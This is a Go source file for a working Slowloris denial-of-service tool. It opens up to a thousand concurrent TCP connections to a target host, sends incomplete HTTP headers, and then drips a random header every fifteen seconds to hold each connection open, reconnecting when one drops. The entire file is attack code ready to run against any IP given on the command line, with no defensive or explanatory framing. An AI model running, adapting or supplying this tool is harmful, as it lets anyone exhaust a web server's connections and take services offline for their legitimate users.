package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"
)

const timeOut = 3
const sleep = 15

var port = flag.String("p", "80", "to open port on the targeted machine")
var routines = flag.Int("r", 1000, "the number of concurent routines")
var wg sync.WaitGroup

var headers = []string{
	"GET / HTTP/1.1",
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept-language: en-US,en,q=0.5",
	"Connection: Keep-Alive",
}

func usage() {
	fmt.Printf("You need to specify the ip of the target machine\n")
	fmt.Print("An example is 195.17.56.213 -p 8080 \n")
	flag.PrintDefaults()
}
func slowLoris(target string, indx int) {
	conn, err := net.DialTimeout("tcp", target+":"+*port, timeOut*time.Second)
	if err != nil {
		fmt.Printf("Couldn't connect to %s\n", target)
		wg.Done()
		return
	}
	for _, header := range headers {
		_, err = fmt.Fprintf(conn, header+"\r\n")
		if err != nil {
			fmt.Printf("{%v} Couldn't send the headers to the target", indx)
			wg.Done()
			return
		}
	}
	for {
		_, err := fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000))
		if err != nil {
			fmt.Printf("{%v} Couln't send data to the targe, trying reopening", indx)
			defer slowLoris(target, indx)
			return
		}
		time.Sleep(sleep * time.Second)
	}

}
func main() {
	flag.Usage = usage
	flag.Parse()
	if flag.NArg() < 1 {
		flag.Usage()
		os.Exit(0)
	}
	target := flag.Arg(0)
	fmt.Printf("Attacking %s with %v routines \n", target, *routines)
	for i := 1; i <= *routines; i++ {
		wg.Add(1)
		go slowLoris(target, i)
	}
	wg.Wait()
}
